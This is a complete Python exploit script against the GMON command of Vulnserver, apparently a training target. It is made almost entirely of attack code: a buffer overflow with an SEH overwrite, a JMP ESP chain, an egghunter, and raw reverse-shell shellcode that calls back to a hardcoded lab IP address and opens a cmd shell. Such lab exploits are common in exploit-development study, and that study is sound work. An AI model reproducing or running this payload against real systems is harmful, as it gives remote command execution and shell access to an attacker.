# Exploit for Vulnserver - GMON - Custom Reverse Shell
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

egghunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x57\x30"
"\x30\x54\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

Custom_rev_shell = "\x31\xdb\x53\x53\x53\xb3\x06\x53\x31\xdb\x43\x53\x43\x53\xbb\x6a\x8b\xab\x71\xff\xd3\x96\x68\xc0\xa8\x88\x80\x66\x68\x23\x29\x31\xdb\x80\xc3\x02\x66\x53\x89\xe3\x6a\x16\x53\x56\xbb\x07\x4a\xab\x71\xff\xd3\xbb\x63\x63\x6d\x64\xc1\xeb\x08\x53\x89\xe1\x31\xd2\x56\x56\x56\x52\x52\x31\xc0\x66\xb8\x01\x01\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x80\xc2\x2c\x52\x89\xe0\x31\xd2\x52\x52\x52\x52\x54\x50\x31\xdb\x53\x53\x53\x43\x53\x4b\x53\x53\x51\x53\xbb\x6b\x23\x80\x7c\xff\xd3"

cmd    = "GMON /.:/"
junk1  = "A" * 163
nops   = "\x90" * 20
junk2  = "B" * (3495-58-len(junk1+nops+Custom_rev_shell))
jump   = "\x83\xc4\x74"     # ADD ESP, 0x74
jump  += "\x83\xc4\x74"     # ADD ESP, 0x74
jump  += "\x83\xc4\x74"     # ADD ESP, 0x74
jump  += "\x83\xc4\x74"     # ADD ESP, 0x74
jump  += "\x83\xc4\x74"     # ADD ESP, 0x74
jump  += "\x83\xc4\x74"     # ADD ESP, 0x74
jump  += "\x83\xc4\x74"     # ADD ESP, 0x74
jump  += "\x83\xc4\x74"     # ADD ESP, 0x74
jump  += "\x83\xc4\x74"     # ADD ESP, 0x74
jump  += "\x83\xc4\x74"     # ADD ESP, 0x74
jump  += "\xff\xe4"         # JMP ESP
junk3  = "B" * (58-len(jump))
nseh   = "\xEB\xC4\x90\x90"      # short jump negative 58
seh    = "\xb4\x10\x50\x62"      # 0x625010b4 pop ebx # pop ebp # ret essfunc.dll
junk4  = "C" * (5000-len(junk1+junk2+junk3+nops+nseh+seh+jump+Custom_rev_shell))

buffer = cmd + junk1 + nops + Custom_rev_shell + junk2 + jump + junk3 + nseh + seh + junk4

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.136.129", 9999))
print s.recv(1024)
s.send(buffer)
s.close()
